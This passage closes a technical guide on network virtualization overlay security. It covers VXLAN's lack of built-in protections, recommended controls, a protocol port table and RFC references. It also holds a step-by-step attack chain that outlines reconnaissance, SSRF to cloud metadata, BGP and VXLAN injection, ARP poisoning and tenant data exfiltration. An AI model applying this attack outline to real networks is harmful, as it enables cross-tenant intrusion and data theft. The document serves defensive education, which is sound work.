   → Answered by HER list from EVPN Type-3 routes (send unicast copies to all VTEPs in the VNI)

### 20.3 The Security Mental Model

```
VXLAN security posture = ZERO by default

Without additional controls:
  ✗ No authentication between VTEPs
  ✗ No encryption of tenant traffic
  ✗ No source VTEP verification
  ✗ VNI is just a number — anyone can set it

With proper controls:
  ✓ Underlay ACLs restrict VTEP-to-VTEP only
  ✓ IPsec between VTEPs (optional, costly performance)
  ✓ BGP-EVPN with MD5/TCP-AO
  ✓ Microsegmentation enforced at NVE ingress/egress
  ✓ VTEP IP allowlist (only permit-listed VTEPs)
```

### 20.4 Protocol Port Reference

| Protocol | Transport | Port | Notes |
|----------|-----------|------|-------|
| VXLAN | UDP | 4789 | IANA standard (old Linux used 8472) |
| GENEVE | UDP | 6081 | IANA standard |
| STT | TCP (fake) | 7471 | Legacy, VMware |
| NVGRE | IP proto 47 | N/A | GRE, no port |
| BGP-EVPN | TCP | 179 | Standard BGP port |
| OpenFlow | TCP | 6633/6653 | OVS controller |

### 20.5 Attack Chain for NVE Environments

```
Step 1: Reconnaissance
  → Scan for UDP/4789 (VXLAN), UDP/6081 (GENEVE), TCP/179 (BGP)
  → Passive capture on underlay to identify VTEPs and VNIs
  → Enumerate cloud VPC topology (route tables, peering, TGW)

Step 2: Initial Access
  → SSRF to cloud metadata service (169.254.169.254)
  → Compromised VM in shared VNI (cloud tenant escape)
  → BGP session injection (if TCP/179 reachable)
  → VXLAN injection if UDP/4789 reachable from attacker position

Step 3: Lateral Movement
  → ARP poison within VNI to MITM traffic
  → Cross-VNI injection if source VTEP validation absent
  → VPC peering route table manipulation (if IAM misconfig)
  → Compromise NVE host → capture all VNIs on that hypervisor

Step 4: Impact
  → Tenant data exfiltration (plaintext inner frames)
  → Traffic redirection / MITM
  → Cross-tenant access (tenant isolation bypass)
  → DoS via BGP route injection or BGP table flood
```

---

## References

- **RFC 7348** — Virtual eXtensible Local Area Network (VXLAN)
- **RFC 7637** — NVGRE: Network Virtualization using Generic Routing Encapsulation
- **RFC 8926** — Geneve: Generic Network Virtualization Encapsulation
- **RFC 7432** — BGP MPLS-Based Ethernet VPN
- **RFC 8365** — A Network Virtualization Overlay Solution Using Ethernet VPN (EVPN)
- **RFC 9135** — Integrated Routing and Bridging in Ethernet VPN (EVPN)
- **RFC 7209** — Requirements for Ethernet VPN (EVPN)
- **RFC 8214** — Virtual Private Wire Service Support in Ethernet VPN
- **draft-ietf-nvo3-security-requirements** — Security Requirements for NVO3
- **AWS Nitro System:** https://aws.amazon.com/ec2/nitro/
- **OVN Architecture:** https://www.ovn.org/en/architecture/
- **VMware NSX-T Reference:** https://docs.vmware.com/en/VMware-NSX-T-Data-Center/

